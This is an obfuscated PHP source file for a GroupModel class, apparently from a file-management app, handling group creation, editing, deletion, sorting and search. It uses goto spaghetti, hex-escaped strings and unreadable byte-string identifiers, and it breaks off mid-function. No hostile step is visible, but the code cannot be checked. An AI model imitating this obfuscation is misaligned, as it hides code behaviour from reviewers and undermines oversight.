<?php
 goto D£Ù¥êŸŒ; e«·é¼‡ºí: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\155\145" => "\x67\x72\x6f\x75\x70\137\155\145\x74\x61", "\x6d\145\164\141\106\x69\x65\x6c\144" => "\147\x72\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($DÖáğ‘¦ïÖ) { $A¥ ÁãÂ =& $_SERVER[¬ˆÚÂ”Éğä]; return array($A¥ ÁãÂ[2190] => array($DÖáğ‘¦ïÖ[0], $A¥ ÁãÂ[2191]), $A¥ ÁãÂ[2192] => array($DÖáğ‘¦ïÖ[0], $A¥ ÁãÂ[2191])); } protected function getInfo($F‚ÜƒÊ˜ğÎ) { $EØîëî¸óµ = $this->getInfoSimple($F‚ÜƒÊ˜ğÎ); if (!$EØîëî¸óµ) { return !1; } return $this->_listDataApplyItem($EØîëî¸óµ); } protected function getInfoSimple($Eª†¨¾ÙÖÌ, $CµÉ««ÖÆ = false) { $aãİƒ«»ƒ¬ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($CµÉ««ÖÆ) { $F‹ÓÍµ¯„ = array($aãİƒ«»ƒ¬[2121] => intval($Eª†¨¾ÙÖÌ)); $BŞá÷æÀ¿‰ = $this->where($F‹ÓÍµ¯„)->find(); return is_array($BŞá÷æÀ¿‰) ? $BŞá÷æÀ¿‰ : array(); } return $this->cacheFunctionGet($aãİƒ«»ƒ¬[2193], $Eª†¨¾ÙÖÌ); } protected function groupAdd($e™ª±İ¥¹) { goto b‰²˜Ÿô”ô; Bƒ¥¤ÖÅ¨ñ: if (isset($e™ª±İ¥¹[$e»¥‹‡‹è[2196]])) { $this->metaSet($d¶²¢±®ã£, array($e»¥‹‡‹è[2196] => $e™ª±İ¥¹[$e»¥‹‡‹è[2196]], $e»¥‹‡‹è[2197] => $e™ª±İ¥¹[$e»¥‹‡‹è[2197]])); unset($e™ª±İ¥¹[$e»¥‹‡‹è[2196]]); unset($e™ª±İ¥¹[$e»¥‹‡‹è[2197]]); } Model($e»¥‹‡‹è[1130])->groupRootAdd($d¶²¢±®ã£); return $d¶²¢±®ã£; goto f‘Ù¼Œ«ğÔ; dÙÆêƒ¦ä³: if ($f×ª•™èÛ[$e»¥‹‡‹è[461]]) { $Bç Ôäµ„ = $f×ª•™èÛ[$e»¥‹‡‹è[461]] . $f×ª•™èÛ[$e»¥‹‡‹è[2121]] . $e»¥‹‡‹è[47]; } $Dè”¶êÃˆì = array($e»¥‹‡‹è[386] => $this->groupNameAuto($e™ª±İ¥¹[$e»¥‹‡‹è[463]], $e™ª±İ¥¹[$e»¥‹‡‹è[28]]), $e»¥‹‡‹è[368] => $e™ª±İ¥¹[$e»¥‹‡‹è[463]], $e»¥‹‡‹è[527] => $Bç Ôäµ„, $e»¥‹‡‹è[2194] => $e™ª±İ¥¹[$e»¥‹‡‹è[2105]], $e»¥‹‡‹è[2195] => 0, $e»¥‹‡‹è[2125] => 0); if (isset($e™ª±İ¥¹[$e»¥‹‡‹è[2143]])) { $Dè”¶êÃˆì[$e»¥‹‡‹è[2143]] = $e™ª±İ¥¹[$e»¥‹‡‹è[2143]]; } else { $dí›”‡ËÃÕ = $this->max($e»¥‹‡‹è[2143]); if (!$dí›”‡ËÃÕ) { $dí›”‡ËÃÕ = 0; } $Dè”¶êÃˆì[$e»¥‹‡‹è[2143]] = $dí›”‡ËÃÕ + 1; } goto c½İ‹…È…; c½İ‹…È…: if (!empty($e™ª±İ¥¹[$e»¥‹‡‹è[2121]])) { $Dè”¶êÃˆì[$e»¥‹‡‹è[2121]] = $e™ª±İ¥¹[$e»¥‹‡‹è[2121]]; } $d¶²¢±®ã£ = $this->add($Dè”¶êÃˆì); $this->setNamePinyin($d¶²¢±®ã£, $Dè”¶êÃˆì[$e»¥‹‡‹è[28]]); goto Bƒ¥¤ÖÅ¨ñ; b‰²˜Ÿô”ô: $e»¥‹‡‹è =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$e™ª±İ¥¹[$e»¥‹‡‹è[463]] && isset($e™ª±İ¥¹[$e»¥‹‡‹è[2121]]) && $e™ª±İ¥¹[$e»¥‹‡‹è[2121]] == 1) { if ($f×ª•™èÛ = $this->getInfoSimple($e™ª±İ¥¹[$e»¥‹‡‹è[2121]], !0)) { return $e™ª±İ¥¹[$e»¥‹‡‹è[2121]]; } } else { $f×ª•™èÛ = $this->getInfoSimple($e™ª±İ¥¹[$e»¥‹‡‹è[463]]); if (!$f×ª•™èÛ) { return !1; } } $Bç Ôäµ„ = $e»¥‹‡‹è[472]; goto dÙÆêƒ¦ä³; f‘Ù¼Œ«ğÔ: } protected function groupEdit($fèÔò½‡‰Ú, $c÷¿§–•Ê) { $BÔÔÏÙ¢³ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!empty($c÷¿§–•Ê[$BÔÔÏÙ¢³[463]])) { $E‡ÒßáÛ‡È = $this->getInfoSimple($fèÔò½‡‰Ú); $A—íêÁ´ÉÎ = $this->getInfoSimple($c÷¿§–•Ê[$BÔÔÏÙ¢³[463]]); if (!$E‡ÒßáÛ‡È || !$A—íêÁ´ÉÎ) { return !1; } if ($E‡ÒßáÛ‡È[$BÔÔÏÙ¢³[2121]] == $A—íêÁ´ÉÎ[$BÔÔÏÙ¢³[2121]]) { return !1; } if ($c÷¿§–•Ê[$BÔÔÏÙ¢³[463]] != $E‡ÒßáÛ‡È[$BÔÔÏÙ¢³[463]]) { if ($A—íêÁ´ÉÎ[$BÔÔÏÙ¢³[461]] !== $E‡ÒßáÛ‡È[$BÔÔÏÙ¢³[461]] && strpos($A—íêÁ´ÉÎ[$BÔÔÏÙ¢³[461]], $E‡ÒßáÛ‡È[$BÔÔÏÙ¢³[461]] . $E‡ÒßáÛ‡È[$BÔÔÏÙ¢³[2121]] . $BÔÔÏÙ¢³[47]) === 0) { return !1; } $c÷¿§–•Ê[$BÔÔÏÙ¢³[527]] = $A—íêÁ´ÉÎ[$BÔÔÏÙ¢³[461]] . $c÷¿§–•Ê[$BÔÔÏÙ¢³[463]] . $BÔÔÏÙ¢³[47]; $this->_changeChildLevel($E‡ÒßáÛ‡È, $A—íêÁ´ÉÎ); } } if (isset($c÷¿§–•Ê[$BÔÔÏÙ¢³[28]])) { $this->setNamePinyin($fèÔò½‡‰Ú, $c÷¿§–•Ê[$BÔÔÏÙ¢³[28]]); } if (isset($c÷¿§–•Ê[$BÔÔÏÙ¢³[2196]])) { $this->metaSet($fèÔò½‡‰Ú, array($BÔÔÏÙ¢³[2196] => $c÷¿§–•Ê[$BÔÔÏÙ¢³[2196]], $BÔÔÏÙ¢³[2197] => $c÷¿§–•Ê[$BÔÔÏÙ¢³[2197]])); unset($c÷¿§–•Ê[$BÔÔÏÙ¢³[2196]]); unset($c÷¿§–•Ê[$BÔÔÏÙ¢³[2197]]); } return $this->where(array($BÔÔÏÙ¢³[2198] => $fèÔò½‡‰Ú))->save($c÷¿§–•Ê); } private function _changeChildLevel($b¬ —½À¤, $CĞÎÌÂí, $eæÓ­çÖ· = false) { goto d†ª×‚ƒ±â; B•õô‹á­Î: $this->where($e ó¿Ü‚)->data($AŞ«£¶ğÑ­)->save(); goto c‚ºÓ°ù¡Š; d†ª×‚ƒ±â: $C´ÖÌ†Šæ =& $_SERVER[¬ˆÚÂ”Éğä]; $c™Í—Æ´óÔ = $b¬ —½À¤[$C´ÖÌ†Šæ[461]] . $b¬ —½À¤[$C´ÖÌ†Šæ[2121]] . $C´ÖÌ†Šæ[47]; $Aš´¨Ú¹÷ = $CĞÎÌÂí[$C´ÖÌ†Šæ[461]] . $CĞÎÌÂí[$C´ÖÌ†Šæ[2121]] . $C´ÖÌ†Šæ[47] . $b¬ —½À¤[$C´ÖÌ†Šæ[2121]] . $C´ÖÌ†Šæ[47]; goto c¢”…ô³ç‚; c¢”…ô³ç‚: if ($eæÓ­çÖ·) { $Aš´¨Ú¹÷ = $CĞÎÌÂí[$C´ÖÌ†Šæ[461]] . $CĞÎÌÂí[$C´ÖÌ†Šæ[2121]] . $C´ÖÌ†Šæ[47]; } $e ó¿Ü‚ = array($C´ÖÌ†Šæ[527] => array($C´ÖÌ†Šæ[485], $b¬ —½À¤[$C´ÖÌ†Šæ[461]] . $b¬ —½À¤[$C´ÖÌ†Šæ[2121]] . $C´ÖÌ†Šæ[486])); $AŞ«£¶ğÑ­ = array($C´ÖÌ†Šæ[527] => array($C´ÖÌ†Šæ[536], "\162\x65\x70\x6c\141\143\x65\50\160\x61\x72\x65\156\164\x4c\x65\x76\x65\x6c\54\x27{$c™Í—Æ´óÔ}\x27\54\x27{$Aš´¨Ú¹÷}\x27\x29")); goto B•õô‹á­Î; c‚ºÓ°ù¡Š: } public function setNamePinyin($E†–ÔÀïñß, $D·áóİ‹¯Á = false) { $dë“ö³ ’Ä =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$D·áóİ‹¯Á) { $bëäÀï£öÖ = $this->getInfoSimple($E†–ÔÀïñß); $D·áóİ‹¯Á = $bëäÀï£öÖ[$dë“ö³ ’Ä[28]]; } if (!Input::check($D·áóİ‹¯Á, $dë“ö³ ’Ä[530])) { $this->metaSet($E†–ÔÀïñß, $dë“ö³ ’Ä[416], null); $this->metaSet($E†–ÔÀïñß, $dë“ö³ ’Ä[415], null); return; } $Eà’¢ÀõÓº = array($dë“ö³ ’Ä[416] => str_replace($dë“ö³ ’Ä[50], $dë“ö³ ’Ä[33], Pinyin::encode($D·áóİ‹¯Á)), $dë“ö³ ’Ä[415] => Pinyin::encode($D·áóİ‹¯Á, $dë“ö³ ’Ä[531])); $this->metaSet($E†–ÔÀïñß, $Eà’¢ÀõÓº); } protected function groupStatus($D³óº¡ —, $fğ¿œˆ¤™¬) { goto AİÒÅ¥‘º; dœ¶Œ™Â¬: foreach ($aÚ®ÍÑï¹È as $D³óº¡ —) { $EøÍ·†´ß[] = array($Aéœ¼ğ…‹[2121] => $D³óº¡ —, $Aéœ¼ğ…‹[89] => $Aéœ¼ğ…‹[697], $Aéœ¼ğ…‹[359] => $fğ¿œˆ¤™¬); } return Model($Aéœ¼ğ…‹[2199])->addAll($EøÍ·†´ß, array(), !0); goto Bå­‚­Õğ; FÅ¸Ê„„Ò: if ($fğ¿œˆ¤™¬ == $Aéœ¼ğ…‹[83]) { $aÚ®ÍÑï¹È = $this->parentLevelArray($D·¡†”¡æ[$Aéœ¼ğ…‹[461]]); } else { $eÛâïˆá•Ï = array($Aéœ¼ğ…‹[527] => array($Aéœ¼ğ…‹[485], $D·¡†”¡æ[$Aéœ¼ğ…‹[461]] . $D·¡†”¡æ[$Aéœ¼ğ…‹[2121]] . $Aéœ¼ğ…‹[486])); $aÚ®ÍÑï¹È = $this->where($eÛâïˆá•Ï)->field($Aéœ¼ğ…‹[2121])->select(); $aÚ®ÍÑï¹È = array_to_keyvalue($aÚ®ÍÑï¹È, $Aéœ¼ğ…‹[33], $Aéœ¼ğ…‹[2121]); } $aÚ®ÍÑï¹È[] = $D·¡†”¡æ[$Aéœ¼ğ…‹[2121]]; $EøÍ·†´ß = array(); goto dœ¶Œ™Â¬; AİÒÅ¥‘º: $Aéœ¼ğ…‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $D·¡†”¡æ = $this->getInfoSimple($D³óº¡ —); if (!$D·¡†”¡æ) { return !1; } goto FÅ¸Ê„„Ò; Bå­‚­Õğ: } protected function groupRemove($dà¾ôß‚ŒŸ) { goto C‘×„Ä¤Àá; A²„¢ì²¸¦: $this->where(array($B‘Åôœ ƒ[463] => $dà¾ôß‚ŒŸ))->save(array($B‘Åôœ ƒ[463] => $CÁ¦Š¹ªÍ‰[$B‘Åôœ ƒ[463]])); Model($B‘Åôœ ƒ[2199])->where($Aâ¦èÅ‹†Ï)->delete(); Model($B‘Åôœ ƒ[2200])->where($Aâ¦èÅ‹†Ï)->delete(); goto C‚ŒÓ¥‰‚; C‚ŒÓ¥‰‚: Model($B‘Åôœ ƒ[760])->groupRootRemove($dà¾ôß‚ŒŸ); return $this->where($Aâ¦èÅ‹†Ï)->delete(); goto EÏäôÎ§µ”; C‘×„Ä¤Àá: $B‘Åôœ ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $Aâ¦èÅ‹†Ï = array($B‘Åôœ ƒ[2121] => $dà¾ôß‚ŒŸ); $CÁ¦Š¹ªÍ‰ = $this->where($Aâ¦èÅ‹†Ï)->find(); goto cë„ğ»ˆ; cë„ğ»ˆ: if (!$CÁ¦Š¹ªÍ‰ || $CÁ¦Š¹ªÍ‰[$B‘Åôœ ƒ[463]] == 0) { return !1; } $AŒŞÂÏ„¹ƒ = $this->getInfoSimple($CÁ¦Š¹ªÍ‰[$B‘Åôœ ƒ[463]]); $this->_changeChildLevel($CÁ¦Š¹ªÍ‰, $AŒŞÂÏ„¹ƒ, !0); goto A²„¢ì²¸¦; EÏäôÎ§µ”: } protected function groupSort($EÁİ—Äí…) { $c—ç§¸¯‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $A¤ğì±Åï‡ = array(); foreach ($EÁİ—Äí… as $fŒöŠŠæ‚ì => $aÉ¾ßáá«Ë) { $A¤ğì±Åï‡[] = array($c—ç§¸¯‹[2121], $aÉ¾ßáá«Ë, $c—ç§¸¯‹[2143], $fŒöŠŠæ‚ì + 1); } $this->saveAll($A¤ğì±Åï‡); } public function listData() { $A‚µ¿…µì = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A‚µ¿…µì[$_SERVER[¬ˆÚÂ”Éğä][354]]); return $A‚µ¿…µì; } private function _makeOrder($C óÜÀ§ë = '') { goto fœ³èšÉá; fœ³èšÉá: $dÁÏÍ–ÇÍØ =& $_SERVER[¬ˆÚÂ”Éğä]; $aË¨©ÃÕĞÔ = array($dÁÏÍ–ÇÍØ[2121], $dÁÏÍ–ÇÍØ[28], $dÁÏÍ–ÇÍØ[2107], $dÁÏÍ–ÇÍØ[187]); $a¦¶¥­®âœ = array($dÁÏÍ–ÇÍØ[402] => $dÁÏÍ–ÇÍØ[403], $dÁÏÍ–ÇÍØ[404] => $dÁÏÍ–ÇÍØ[405]); goto D¼¹Œ‘µ’÷; D¼¹Œ‘µ’÷: $eœ¯¾ƒÏêÍ = Input::get($dÁÏÍ–ÇÍØ[407], $dÁÏÍ–ÇÍØ[7], $dÁÏÍ–ÇÍØ[2125], $aË¨©ÃÕĞÔ); $bå•»¡Ğ‰æ = Input::get($dÁÏÍ–ÇÍØ[408], $dÁÏÍ–ÇÍØ[7], $dÁÏÍ–ÇÍØ[2201], array($dÁÏÍ–ÇÍØ[2201], $dÁÏÍ–ÇÍØ[404])); $bå•»¡Ğ‰æ = $a¦¶¥­®âœ[$bå•»¡Ğ‰æ]; goto CÚŒ«²É°‚; CÚŒ«²É°‚: $C óÜÀ§ë = $C óÜÀ§ë . "{$eœ¯¾ƒÏêÍ}\40{$bå•»¡Ğ‰æ}\x2c\x20\x67\162\157\x75\160\111\x44\x20\x61\x73\143"; return $this->order($C óÜÀ§ë); goto bİîãñ¼—ù; bİîãñ¼—ù: } public function listChild($b†©†Ñ´Ã…) { $AÒ†ÊÈ‹ƒé =& $_SERVER[¬ˆÚÂ”Éğä]; $aİÏÀÅ¢õ÷ = $this->where(array($AÒ†ÊÈ‹ƒé[463] => $b†©†Ñ´Ã…))->_makeOrder()->selectPage(200); $this->_listDataApply($aİÏÀÅ¢õ÷[$AÒ†ÊÈ‹ƒé[354]]); return $aİÏÀÅ¢õ÷; } public function listByID($aÇ‰–°•›˜) { $a¿‚ë¾Åà’ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$aÇ‰–°•›˜) { return array(); } $B“Š½›¢–™ = array($a¿‚ë¾Åà’[2121] => array($a¿‚ë¾Åà’[7], $aÇ‰–°•›˜)); $Bæ÷ò…¡çó = $this->where($B“Š½›¢–™)->select(); $this->_listDataApply($Bæ÷ò…¡çó); return $Bæ÷ò…¡çó; } public function listSearch($cˆ¤×–•Õ) { goto b±Äî²Š¬ê; eä„Ò›ŒµÔ: if (!trim($Fª‹°ô­‘)) { return !1; } $Fª‹°ô­‘ = str_replace($DßÏâ‘¶ëÓ[2204], $DßÏâ‘¶ëÓ[2205], $Fª‹°ô­‘); $a‹ç¾Ú¡§Ê = array($DßÏâ‘¶ëÓ[2121] => array($DßÏâ‘¶ëÓ[759], "\x25{$Fª‹°ô­‘}\45"), $DßÏâ‘¶ëÓ[28] => array($DßÏâ‘¶ëÓ[759], "\x25{$Fª‹°ô­‘}\45"), $DßÏâ‘¶ëÓ[926] => $DßÏâ‘¶ëÓ[2206]); goto EÇ…”×ë¯; b±Äî²Š¬ê: $DßÏâ‘¶ëÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $Fª‹°ô­‘ = $cˆ¤×–•Õ[$DßÏâ‘¶ëÓ[2202]]; $aÀËĞÈÂÒÂ = isset($cˆ¤×–•Õ[$DßÏâ‘¶ëÓ[2203]]) ? $cˆ¤×–•Õ[$DßÏâ‘¶ëÓ[2203]] : !1; goto eä„Ò›ŒµÔ; DÑˆˆùÔŞ: if (!$B±â–§…Ÿ || count($B±â–§…Ÿ[$DßÏâ‘¶ëÓ[354]]) < 5 && Input::check($Fª‹°ô­‘, $DßÏâ‘¶ëÓ[306])) { goto EŸéª—ÄÜ³; E–Ò·Úó·÷: $c£ò”ÇŠ¿È = array_merge($f¡Óºµ—Í, $aÌõŸÎİŠ, $B±â–§…Ÿ[$DßÏâ‘¶ëÓ[354]]); $B±â–§…Ÿ[$DßÏâ‘¶ëÓ[354]] = array_unique_by_key($c£ò”ÇŠ¿È, $DßÏâ‘¶ëÓ[2121]); $B±â–§…Ÿ[$DßÏâ‘¶ëÓ[351]][$DßÏâ‘¶ëÓ[352]] = count($B±â–§…Ÿ[$DßÏâ‘¶ëÓ[354]]); goto Dà¸êõÎ©; EŸéª—ÄÜ³: $A¥†¿º‹»¹ = $this->groupChildrenAll($aÀËĞÈÂÒÂ); $f¡Óºµ—Í = $this->_searchFromMeta($DßÏâ‘¶ëÓ[415], $Fª‹°ô­‘, 10, $A¥†¿º‹»¹); $aÌõŸÎİŠ = $this->_searchFromMeta($DßÏâ‘¶ëÓ[416], $Fª‹°ô­‘, 10, $A¥†¿º‹»¹); goto E–Ò·Úó·÷; Dà¸êõÎ©: $B±â–§…Ÿ[$DßÏâ‘¶ëÓ[351]][$DßÏâ‘¶ëÓ[353]] = ceil($B±â–§…Ÿ[$DßÏâ‘¶ëÓ[351]][$DßÏâ‘¶ëÓ[352]] / $B±â–§…Ÿ[$DßÏâ‘¶ëÓ[351]][$DßÏâ‘¶ëÓ[349]]); goto EæÃ¤ã‰ïÆ; EæÃ¤ã‰ïÆ: } $this->_listDataApply($B±â–§…Ÿ[$DßÏâ‘¶ëÓ[354]]); return $B±â–§…Ÿ; goto b¸©æÏ½È±; EÇ…”×ë¯: if ($aÀËĞÈÂÒÂ) { $e­ÁƒµôùÂ = $this->getInfoSimple($aÀËĞÈÂÒÂ); $EÓè£Û¶Ù = $e­ÁƒµôùÂ[$DßÏâ‘¶ëÓ[461]] . $aÀËĞÈÂÒÂ . $DßÏâ‘¶ëÓ[486]; $a‹ç¾Ú¡§Ê = array($a‹ç¾Ú¡§Ê, array($DßÏâ‘¶ëÓ[461] => array($DßÏâ‘¶ëÓ[759], $EÓè£Û¶Ù))); } $B±â–§…Ÿ = $this->_makeOrder()->where($a‹ç¾Ú¡§Ê)->selectPage(20); $B±â–§…Ÿ = $B±â–§…Ÿ ? $B±â–§…Ÿ : array(); goto DÑˆˆùÔŞ; b¸©æÏ½È±: } protected function groupChildrenAll($dß¸‰ø´Ú) { $f›¤›¿½°œ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$dß¸‰ø´Ú) { return !1; } if (is_string($dß¸‰ø´Ú)) { $dß¸‰ø´Ú = array($dß¸‰ø´Ú); } $b¤Š»Ï£‰ƒ = $dß¸‰ø´Ú; foreach ($dß¸‰ø´Ú as $Aœµä•«ƒ•) { $BŞ³¿ò¼ê = $this->getInfoSimple($Aœµä•«ƒ•); $fÏÕƒÚœˆÒ = array($f›¤›¿½°œ[461] => array($f›¤›¿½°œ[759], $BŞ³¿ò¼ê[$f›¤›¿½°œ[461]] . $Aœµä•«ƒ• . $f›¤›¿½°œ[486])); $A½ã†ÉÉÏœ = $this->field($f›¤›¿½°œ[2121])->where($fÏÕƒÚœˆÒ)->select(); $b¤Š»Ï£‰ƒ = array_merge($b¤Š»Ï£‰ƒ, array_to_keyvalue($A½ã†ÉÉÏœ, $f›¤›¿½°œ[33], $f›¤›¿½°œ[2121])); } return array_unique($b¤Š»Ï£‰ƒ); } private function _searchFromMeta($F‰®Áøê¹å, $B›Ò…ƒ‘Ôæ, $f¢ğãÏ²‰, $F¨±¤«ª˜¢) { goto Cçµä„ÖÅ‰; E¡¬°…•½: return $eØìïÑğ¿è; goto B÷¡±ê›Û£; Cçµä„ÖÅ‰: $d®÷ò¤‚µ£ =& $_SERVER[¬ˆÚÂ”Éğä]; $B›Ò…ƒ‘Ôæ = strtolower($B›Ò…ƒ‘Ôæ); $FÔèĞ½ñÁÓ = array($d®÷ò¤‚µ£[89] => $F‰®Áøê¹å, $d®÷ò¤‚µ£[359] => array($d®÷ò¤‚µ£[759], "\x25{$B›Ò…ƒ‘Ôæ}\45")); goto d„¯ø‚Öó™; DƒÉö‚°í¢: $eî´ˆ°£İÅ = array_to_keyvalue($eî´ˆ°£İÅ, $d®÷ò¤‚µ£[33], $d®÷ò¤‚µ£[2121]); $eØìïÑğ¿è = $this->where(array($d®÷ò¤‚µ£[2198] => array($d®÷ò¤‚µ£[7], $eî´ˆ°£İÅ)))->select(); if (!$eØìïÑğ¿è) { return array(); } goto E¡¬°…•½; d„¯ø‚Öó™: if ($F¨±¤«ª˜¢) { $FÔèĞ½ñÁÓ[$d®÷ò¤‚µ£[2121]] = array($d®÷ò¤‚µ£[7], $F¨±¤«ª˜¢); } $eî´ˆ°£İÅ = Model($d®÷ò¤‚µ£[2207])->where($FÔèĞ½ñÁÓ)->limit($f¢ğãÏ²‰)->select(); if (!$eî´ˆ°£İÅ) { return array(); } goto DƒÉö‚°í¢; B÷¡±ê›Û£: } protected function _listDataApplyItem($e‘àÒîÕô·) { $C“‡­ÒõÕÔ = array($e‘àÒîÕô·); $this->_listDataApply($C“‡­ÒõÕÔ); return $C“‡­ÒõÕÔ[0]; } protected function _listDataApply(&$Dõ‘§¸Šö½) { goto dğÜŸç‰ï½; aÂÄèŠ­™ë: $this->_listAppendParent($Dõ‘§¸Šö½); $this->_listAppendSourceRoot($Dõ‘§¸Šö½, $aêœ¤êë®ò); goto fš¼ƒæÇ‚¦; Cµ—Ü‘ ÙÙ: $this->_listAppendChildren($Dõ‘§¸Šö½); $this->_listAppendChildrenMember($Dõ‘§¸Šö½); $this->_listAppendMeta($Dõ‘§¸Šö½, $aêœ¤êë®ò); goto aÂÄèŠ­™ë; dğÜŸç‰ï½: $cãâÀøù¹¶ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Dõ‘§¸Šö½) { return; } $aêœ¤êë®ò = array_to_keyvalue($Dõ‘§¸Šö½, $cãâÀøù¹¶[33], $cãâÀøù¹¶[2121]); goto Cµ—Ü‘ ÙÙ; fš¼ƒæÇ‚¦: } private function _listAppendChildren(&$e¢÷Í¯ª³«) { goto fÀ¿ÇÜëÈ·; eŒÕàÛÙ¹: $føàß‰¦±„ = array_to_keyvalue($føàß‰¦±„, $BÚ«ÚÜŠé‘[452]); foreach ($e¢÷Í¯ª³« as &$F¥ÃÚ†šŠá) { $F¥ÃÚ†šŠá[$BÚ«ÚÜŠé‘[2208]] = isset($føàß‰¦±„[$F¥ÃÚ†šŠá[$BÚ«ÚÜŠé‘[2121]] . $BÚ«ÚÜŠé‘[2209]]); } unset($F¥ÃÚ†šŠá); goto BÉù´ÚÉè¯; fÀ¿ÇÜëÈ·: $BÚ«ÚÜŠé‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $D×ëµÁˆŒ– = $BÚ«ÚÜŠé‘[361]; $føàß‰¦±„ = array(); goto d•“Ş àµÖ; d•“Ş àµÖ: $cê½…ÔÚÛ = count($e¢÷Í¯ª³«); $AÌ®ù«Œ«§ = $this->tablePrefix . $this->tableName; for ($C‘º±¼ß·† = 0, $a°¥ôäèÂ¤ = 0; $C‘º±¼ß·† < $cê½…ÔÚÛ; $C‘º±¼ß·†++) { $a°¥ôäèÂ¤++; $AçíÀ¤Á•ç = $e¢÷Í¯ª³«[$C‘º±¼ß·†][$BÚ«ÚÜŠé‘[2121]]; $D×ëµÁˆŒ– .= "\123\105\114\105\x43\124\40\52\x20\106\122\117\115\x20\x28\x53\x45\x4c\105\x43\x54\40\x27{$AçíÀ¤Á•ç}\137\143\x68\x69\x6c\x64\x27\40\x61\x73\40\x68\141\x73\x20\106\122\117\115\40\x60{$AÌ®ù«Œ«§}\140\40\167\150\x65\162\145\x20\160\x61\162\x65\156\x74\111\104\75{$AçíÀ¤Á•ç}\x20\154\151\155\x69\164\x20\61\x29\x20\x61\x73\x20\164\x62\137{$AçíÀ¤Á•ç}\40\x75\156\x69\157\156\x20\x61\x6c\x6c\x20"; if (($a°¥ôäèÂ¤ >= 20 || $C‘º±¼ß·† == $cê½…ÔÚÛ - 1) && $D×ëµÁˆŒ–) { $D×ëµÁˆŒ– = substr($D×ëµÁˆŒ–, 0, -strlen($BÚ«ÚÜŠé‘[451])); $b£ÕìÀ—ãº = $this->query($D×ëµÁˆŒ–); $føàß‰¦±„ = array_merge($føàß‰¦±„, $b£ÕìÀ—ãº); $a°¥ôäèÂ¤ = 0; $D×ëµÁˆŒ– = $BÚ«ÚÜŠé‘[33]; } } goto eŒÕàÛÙ¹; BÉù´ÚÉè¯: } private function _listAppendChildrenMember(&$bƒ‡Á‚©ë) { goto aõ¸‰Ò…”; aõ¸‰Ò…”: $e‡‘‡Œ—öÁ =& $_SERVER[¬ˆÚÂ”Éğä]; $BâÓñ°‰à = $e‡‘‡Œ—öÁ[361]; $A±ƒÀ¶Õ¤´ = array(); goto a‰¬²’»á; CŸôÛ…¬‹Ù: $A±ƒÀ¶Õ¤´ = array_to_keyvalue($A±ƒÀ¶Õ¤´, $e‡‘‡Œ—öÁ[452]); foreach ($bƒ‡Á‚©ë as &$bé¦ô¤¹ì) { $bé¦ô¤¹ì[$e‡‘‡Œ—öÁ[2210]] = isset($A±ƒÀ¶Õ¤´[$bé¦ô¤¹ì[$e‡‘‡Œ—öÁ[2121]] . $e‡‘‡Œ—öÁ[2209]]); } unset($bé¦ô¤¹ì); goto a†„ÀùíÙ; a‰¬²’»á: $aî¤‹¯ª›ğ = count($bƒ‡Á‚©ë); $B˜áåÚ…¤¢ = $this->tablePrefix . $e‡‘‡Œ—öÁ[2200]; for ($aİõ‚ˆ×Ø˜ = 0, $DâÉÔáá¶ = 0; $aİõ‚ˆ×Ø˜ < $aî¤‹¯ª›ğ; $aİõ‚ˆ×Ø˜++) { $DâÉÔáá¶++; $FÒ¯ô®Ã… = $bƒ‡Á‚©ë[$aİõ‚ˆ×Ø˜][$e‡‘‡Œ—öÁ[2121]]; $BâÓñ°‰à .= "\x53\x45\114\x45\x43\x54\40\52\40\106\122\x4f\x4d\x20\x28\123\105\x4c\x45\x43\124\x20\x27{$FÒ¯ô®Ã…}\137\x63\150\151\154\x64\x27\x20\x61\x73\40\150\141\163\x20\x46\122\x4f\115\x20\140{$B˜áåÚ…¤¢}\140\x20\x77\150\145\162\x65\x20\147\x72\x6f\165\160\x49\104\75{$FÒ¯ô®Ã…}\x20\x6c\x69\x6d\x69\164\40\61\51\40\141\x73\40\x74\x62\137{$FÒ¯ô®Ã…}\40\165\x6e\151\157\156\40\x61\154\x6c\40"; if (($DâÉÔáá¶ >= 20 || $aİõ‚ˆ×Ø˜ == $aî¤‹¯ª›ğ - 1) && $BâÓñ°‰à) { $BâÓñ°‰à = substr($BâÓñ°‰à, 0, -strlen($e‡‘‡Œ—öÁ[451])); $E÷Ğ¨ñŒ’ø = $this->query($BâÓñ°‰à); $A±ƒÀ¶Õ¤´ = array_merge($A±ƒÀ¶Õ¤´, $E÷Ğ¨ñŒ’ø); $DâÉÔáá¶ = 0; $BâÓñ°‰à = $e‡‘‡Œ—öÁ[33]; } } goto CŸôÛ…¬‹Ù; a†„ÀùíÙ: } private function _listAppendMeta(&$b¤´İ÷«…, $F ‡„ë†šÜ) { goto døµŞÓ¢ø; døµŞÓ¢ø: $d¦‹Ú„‰Ä‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $B¨‚İãê¦Ø = array($d¦‹Ú„‰Ä‘[2121] => array($d¦‹Ú„‰Ä‘[7], $F ‡„ë†šÜ)); $Bë‰º·Ä± = Model($d¦‹Ú„‰Ä‘[2199])->where($B¨‚İãê¦Ø)->select(); goto FÖÌŞ†œÒ·; B…·èéÔÂä: foreach ($b¤´İ÷«… as &$B¿éÆ¤Í­ë) { $B¿éÆ¤Í­ë[$d¦‹Ú„‰Ä‘[417]] = array(); if (isset($Bë‰º·Ä±[$B¿éÆ¤Í­ë[$d¦‹Ú„‰Ä‘[2121]]])) { $B¿éÆ¤Í­ë[$d¦‹Ú„‰Ä‘[417]] = $Bë‰º·Ä±[$B¿éÆ¤Í­ë[$d¦‹Ú„‰Ä‘[2121]]]; } } unset($B¿éÆ¤Í­ë); goto f‘Æ²¯›¢”; FÖÌŞ†œÒ·: $Bë‰º·Ä± = array_to_keyvalue_group($Bë‰º·Ä±, $d¦‹Ú„‰Ä‘[2121]); foreach ($Bë‰º·Ä± as &$b²ÍİªØ‡¾) { $b²ÍİªØ‡¾ = 